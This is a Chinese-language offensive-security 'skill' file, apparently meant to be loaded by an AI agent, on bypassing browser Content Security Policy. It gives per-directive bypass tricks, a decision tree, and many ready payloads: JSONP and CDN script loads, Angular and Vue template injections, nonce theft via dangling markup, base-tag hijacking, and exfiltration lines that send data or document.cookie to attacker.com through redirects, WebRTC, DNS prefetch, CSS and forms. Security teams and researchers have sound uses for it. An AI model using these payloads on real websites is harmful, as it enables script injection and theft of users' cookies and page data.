# 技能：CSP绕过 — 高级技巧

> **AI加载指令**：涵盖按指令绕过技巧、nonce/哈希滥用、可信CDN利用、绕过CSP的数据外泄以及框架特定绕过。基础模型通常建议`unsafe-inline`绕过而不检查CSP是否实际使用它，或遗漏关键的`base-uri`和`object-src`漏洞。

## 0. 相关路由

- [xss-cross-site-scripting](../xss-cross-site-scripting/SKILL.md) 用于在绕过CSP后传递XSS向量
- [dangling-markup-injection](../dangling-markup-injection/SKILL.md) 当CSP阻止脚本但存在HTML注入时 — 无需JS即可外泄
- [crlf-injection](../crlf-injection/SKILL.md) 当CRLF可以注入CSP头部或通过响应拆分窃取nonce时
- [waf-bypass-techniques](../waf-bypass-techniques/SKILL.md) 当必须绕过WAF和CSP时
- [clickjacking](../clickjacking/SKILL.md) 当CSP缺少`frame-ancestors` — 点击劫持仍可能

---

## 1. CSP指令参考矩阵

| 指令 | 控制 | 默认回退 |
|---|---|---|
| `default-src` | 所有未明确设置的`-src`指令的回退 | 无（浏览器默认：允许所有） |
| `script-src` | JavaScript执行 | `default-src` |
| `style-src` | CSS加载 | `default-src` |
| `img-src` | 图片加载 | `default-src` |
| `connect-src` | XHR、fetch、WebSocket、EventSource | `default-src` |
| `frame-src` | iframe/frame来源 | `default-src` |
| `font-src` | 字体加载 | `default-src` |
| `object-src` | `<object>`、`<embed>`、`<applet>` | `default-src` |
| `media-src` | `<audio>`、`<video>` | `default-src` |
| `base-uri` | `<base>`元素 | **无回退** — 缺失时不受限制 |
| `form-action` | 表单提交目标 | **无回退** — 缺失时不受限制 |
| `frame-ancestors` | 谁可以嵌入此页面（替换X-Frame-Options） | **无回退** — 缺失时不受限制 |
| `report-uri` / `report-to` | 违规报告发送位置 | N/A |
| `navigate-to` | 导航目标（有限浏览器支持） | **无回退** |

**关键洞察**：`base-uri`、`form-action`和`frame-ancestors`不会回退到`default-src`。它们的缺失始终是潜在的绕过向量。

---

## 2. 按指令的绕过技巧

### 2.1 `script-src 'self'`

应用仅允许来自自身来源的脚本。绕过向量：

| 向量 | 技巧 |
|---|---|
| JSONP端点 | `<script src="/api/jsonp?callback=alert(1)//"></script>` — JSONP将回调反射为JS |
| 上传的JS文件 | 上传`.js`文件（例如，头像上传接受任何扩展名）→ `<script src="/uploads/evil.js"></script>` |
| DOM XSS接收器 | 查找DOM接收器（innerHTML、eval、document.write）在现有同源JS中 — 通过URL片段/参数注入 |
| Angular/Vue模板注入 | 如果框架从`'self'`加载，注入模板表达式：`{{constructor.constructor('alert(1)')()}}` |
| Service Worker | 从同源注册SW → 截取并修改响应 |
| 路径混淆 | `<script src="/user-content/;/legit.js">` — 服务器由于路径解析返回用户内容，但URL匹配`'self'` |

### 2.2 `script-src`带CDN白名单

```
script-src 'self' *.googleapis.com *.gstatic.com cdn.jsdelivr.net
```

| 白名单CDN | 绕过 |
|---|---|
| `cdnjs.cloudflare.com` | 通过CDNJS托管任意JS（查找带回调/eval的库）：`angular.js` → 模板注入 |
| `cdn.jsdelivr.net` | jsdelivr提供任何npm包或GitHub文件：`cdn.jsdelivr.net/npm/attacker-package@1.0.0/evil.js` |
| `*.googleapis.com` | Google JSONP端点、Google Maps回调参数 |
| `unpkg.com` | 与jsdelivr相同 — 提供任意npm包 |
| `*.cloudfront.net` | CloudFront分发是共享的 — 任何CF客户的JS都被允许 |

**技巧**：在白名单域上搜索JSONP端点：`site:googleapis.com inurl:callback`

### 2.3 `script-src 'unsafe-eval'`

`eval()`、`Function()`、`setTimeout(string)`、`setInterval(string)`均被允许。

```javascript
// 模板注入 → 浏览器中的RCE等价物
[].constructor.constructor('alert(document.cookie)')()

// JSON.parse不执行代码，但如果结果用于eval上下文中：
// 应用执行：eval('var x = ' + JSON.parse(userInput))
```

### 2.4 `script-src 'nonce-xxx'`

仅匹配nonce属性的脚本执行。

| 绕过 | 条件 |
|---|---|
| Nonce重复使用 | 服务器在请求之间或对所有用户使用相同的nonce → 可预测 |
| 通过CRLF注入Nonce | 响应头部中的CRLF → 注入新的CSP头部带已知nonce，或注入`<script nonce="known">` |
| 悬挂标记窃取Nonce | `<img src="https://attacker.com/steal?`（未关闭）→ 页面内容包括nonce作为URL参数泄露 |
| DOM篡改 | 通过DOM篡改覆盖nonce检查代码：`<form id="nonce"><input id="nonce" value="attacker-controlled">` |
| 脚本小工具 | 受信任的非ced脚本使用DOM数据创建新的脚本元素 — 注入该DOM数据 |

### 2.5 `script-src 'strict-dynamic'`

信任传播：任何由已信任脚本创建的脚本也受信任，无论来源如何。

| 绕过 | 技巧 |
|---|---|
| `base-uri`注入 | `<base href="https://attacker.com/">` → 相对脚本`src`解析为攻击者域。受信任的父脚本加载`./lib.js`，现在指向`https://attacker.com/lib.js` |
| 受信任代码中的脚本小工具 | 查找受信任脚本执行`document.createElement('script'); s.src = location.hash.slice(1)` → 通过URL片段控制 |
| 受信任脚本中的DOM XSS | 受信任脚本从用户控制源读取`innerHTML` → 注入的`<script>`通过`strict-dynamic`受信任 |

### 2.6 Angular / Vue CSP绕过

**Angular（带CSP）**：
```html
<!-- Angular模板表达式绕过script-src当angular.js被白名单时 -->
<div ng-app ng-csp>
  {{$eval.constructor('alert(1)')()}}
</div>

<!-- Angular >= 1.6移除了沙盒，所以更简单： -->
{{constructor.constructor('alert(1)')()}}
```

**Vue.js**：
```html
<!-- Vue 2带运行时编译器 -->
<div id=app>{{_c.constructor('alert(1)')()}}</div>
<script src="https://whitelisted-cdn/vue.js"></script>
<script>new Vue({el:'#app'})</script>
```

### 2.7 Missing `object-src`

如果`object-src`未设置（回退到`default-src`），且`default-src`允许某些来源：

```html
<!-- 基于Flash的绕过（遗留，大多已修补，但旧系统仍出现） -->
<object data="https://attacker.com/evil.swf" type="application/x-shockwave-flash">
  <param name="AllowScriptAccess" value="always">
</object>

<!-- PDF插件滥用 -->
<embed src="/user-upload/evil.pdf" type="application/pdf">
```

### 2.8 Missing `base-uri`

```html
<!-- 注入base标签 → 所有相对URL解析为攻击者 -->
<base href="https://attacker.com/">

<!-- 现有脚本： <script src="/js/app.js"> -->
<!-- 现在加载： https://attacker.com/js/app.js -->
```

这绕过了`'nonce-xxx'`、`'strict-dynamic'`和`script-src 'self'`对于相对脚本路径。

### 2.9 Missing `frame-ancestors`

CSP无`frame-ancestors` → 页面可以被嵌入 → 点击劫持可能。

`X-Frame-Options`头部被`frame-ancestors`如果CSP存在则覆盖。但如果CSP存在而无`frame-ancestors`，某些浏览器完全忽略XFO。

---

## 3. CSP在META标签与头部

```html
<meta http-equiv="Content-Security-Policy" content="script-src 'self'">
```

**META标签限制**：
- 不能设置`frame-ancestors`（在META中忽略）
- 不能设置`report-uri` / `report-to`
- 不能设置`sandbox`
- 如果通过HTML注入*在META标签之前*在DOM顺序中，攻击者的META CSP可能首先被处理（浏览器使用首先遇到的）
- 如果页面同时有头部CSP和META CSP，**两者都适用**（最严格的获胜）

---

## 4. 绕过CSP的数据外泄

当`connect-src`、`img-src`等被锁定时，替代的外泄通道：

| 通道 | 需要CSP指令阻止 | 技巧 |
|---|---|---|
| DNS预取 | 无（CSP无法阻止DNS） | `<link rel="dns-prefetch" href="//data.attacker.com">` |
| WebRTC | 无（CSP无法阻止） | `new RTCPeerConnection({iceServers:[{urls:'stun:attacker.com'}]})` |
| `<link rel=prefetch>` | `default-src`或`connect-src` | 常常在CSP中被忽略 |
| 重定向 | `navigate-to`（很少设置） | `location='https://attacker.com/?'+document.cookie` |
| CSS注入 | `style-src` | `<style>body{background:url(https://attacker.com/?data)}</style>` |
| `<a ping>` | `connect-src` | `<a ping="https://attacker.com/collect" href="#">click</a>` |
| `report-uri`泄露 | N/A | 触发CSP违规 → 报告包含被阻止的URI与数据 |
| 表单提交 | `form-action` | `<form action="https://attacker.com/"><button>Submit</button></form>` |

**基于DNS的外泄几乎无法用CSP阻止** — 这是最可靠的通道。

---

## 5. CSP绕过决策树

```
CSP存在？
├── 读取完整策略（响应头部+META标签）
│
├── 检查明显弱点
│   ├── script-src中存在'unsafe-inline'？ → 标准XSS有效
│   ├── script-src中存在'unsafe-eval'？ → eval/Function/setTimeout绕过
│   ├── *或data:在script-src中？ → <script src="data:,alert(1)">
│   └── 某些页面完全没有CSP头部？ → 查找CSP免页
│
├── 检查缺失指令
│   ├── 无base-uri？ → <base href="https://attacker.com/"> → 挪用相对脚本
│   ├── 无object-src？ → 基于Flash/插件绕过（遗留）
│   ├── 无form-action？ → 通过表单提交外泄
│   ├── 无frame-ancestors？ → 点击劫持可能
│   └── 无connect-src回退到宽松default-src？ → fetch/XHR外泄
│
├── script-src 'self'？
│   ├── 在同源上查找JSONP端点
│   ├── 查找文件上传 → 上传.js文件
│   ├── 查找现有同源脚本中的DOM XSS接收器
│   └── 查找从self加载的Angular/Vue → 模板注入
│
├── script-src带CDN白名单？
│   ├── 检查CDN上的JSONP端点
│   ├── 检查jsdelivr/unpkg/cdnjs → 加载攻击者控制的包
│   └── 检查*.cloudfront.net → 共享分发命名空间
│
├── script-src 'nonce-xxx'？
│   ├── Nonce跨请求重复使用？ → 重放
│   ├── CRLF注入可用？ → 注入nonce
│   ├── 悬挂标记窃取nonce
│   └── 受信任脚本中的脚本小工具
│
├── script-src 'strict-dynamic'？
│   ├── base-uri未设置？ → <base>挪用
│   ├── 受信任脚本中的DOM XSS？ → 继承信任
│   └── 从DOM数据创建动态脚本的脚本小工具
│
└── 所有脚本执行被阻止？
    ├── 悬挂标记注入 → 无需JS外泄（见../dangling-markup-injection/SKILL.md）
    ├── DNS预取外泄
    ├── WebRTC外泄
    ├── CSS注入用于数据提取
    └── 表单动作外泄
```

---

## 6. 技巧笔记 — AI模型遗漏的

1. **`default-src 'self'`不会限制`base-uri`或`form-action`** — 这些没有回退。这是CSP的第一大错误。
2. **`strict-dynamic`忽略白名单**：当`strict-dynamic`存在时，基于主机的允许列表和`'self'`被忽略，仅nonce/hash和信任传播重要。
3. **多个CSP堆叠**：如果`Content-Security-Policy`头部和`<meta>`CSP都存在，浏览器会执行两者 — 有效策略是交集（最严格的）。
4. **`Content-Security-Policy-Report-Only`**不强制执行 — 它仅报告。检查正确的头部名称。
5. **Nonce长度很重要**：Nonces应≥128位熵。短或可预测的nonces可能被暴力破解或猜测。
6. **Report-uri信息泄露**：CSP违规报告发送到`report-uri`包含`blocked-uri`、`source-file`、`line-number` — 这可能向控制报告端点的攻击者泄露内部URL、脚本路径和页面结构。
7. **`data:`在script-src中**：`script-src 'self' data:`允许`<script src="data:text/javascript,alert(1)">` — 简单的绕过，但在实际CSP中常见。
